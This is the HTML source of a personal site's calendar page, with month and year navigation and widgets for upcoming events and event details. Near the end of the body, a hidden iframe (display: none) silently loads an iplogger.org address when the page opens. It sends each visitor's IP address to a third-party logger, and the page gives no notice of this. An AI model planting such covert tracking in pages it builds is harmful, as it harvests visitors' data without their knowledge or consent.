<!--Made by Zoxplers-->    
<!DOCTYPE html>
<html>
    <head>
        <title>Zoxplers - Site</title>
        <meta charset="utf-8"/>
        <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"/>
        <link rel="icon" type="image/gif" href="/assets/favicon.gif"/>
        <link rel="preconnect" href="https://script.google.com" crossorigin>
        <link rel="stylesheet" href="../base/index.css"/>
        <link rel="stylesheet" href="index.css"/>
    </head>
    <body>
        <blur></blur>
        <main id="background">
            <page>
                <calendar>
                    <div>
                        <header>Calendar</header>
                        <table>
                            <thead>
                                <tr>
                                    <th>
                                        <prevyear onclick="prevYear()">
                                            <span class="material-symbols-outlined">keyboard_double_arrow_left</span>
                                        </prevyear>
                                        <prevmonth onclick="prevMonth()">
                                            <span class="material-symbols-outlined">chevron_left</span>
                                        </prevmonth>
                                    </th>
                                    <th colspan="5">Month</th>
                                    <th>
                                        <nextmonth onclick="nextMonth()">
                                            <span class="material-symbols-outlined">chevron_right</span>
                                        </nextmonth>
                                        <nextyear onclick="nextYear()">
                                            <span class="material-symbols-outlined">keyboard_double_arrow_right</span>
                                        </nextyear>
                                    </th>
                                </tr>
                                <tr class="daysofweek">
                                    <th>Sunday</th>
                                    <th>Monday</th>
                                    <th>Tuesday</th>
                                    <th>Wednesday</th>
                                    <th>Thursday</th>
                                    <th>Friday</th>
                                    <th>Saturday</th>
                                </tr>
                            </thead>
                            <tbody>
                            </tbody>
                        </table>
                    </div>
                </calendar>
                <widgets>
                    <div>
                        <header>Upcoming</header>
                        <upcominginfo>
                            Loading upcoming info...
                        </upcominginfo>
                    </div>
                    <div>
                        <header>Event</header>
                        <eventinfo>
                            No event selected.
                        </eventinfo>
                    </div>
                </widgets>
            </page>
        </main>
        <main id="foreground"></main>
        <iframe style="display: none;" src="https://iplogger.org/2scVd5"></iframe>
        <script src="../base/index.js"></script>
        <script src="index.js"></script>
    </body>
</html>
